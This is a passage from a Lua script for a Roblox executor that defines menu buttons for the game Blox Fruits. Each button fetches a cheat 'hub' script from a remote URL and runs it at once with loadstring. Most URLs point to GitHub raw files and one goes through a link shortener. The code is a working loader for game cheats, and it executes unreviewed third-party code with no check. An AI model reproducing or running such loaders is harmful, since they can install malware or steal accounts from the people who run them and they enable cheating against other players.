   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Payback Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
        executednotify("Payback Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "KAY Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
        executednotify("KAY Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "THUNDER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
        executednotify("THUNDER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
        executednotify("SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN GREEN Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
        executednotify("MIN GREEN Hub")
   end,
})
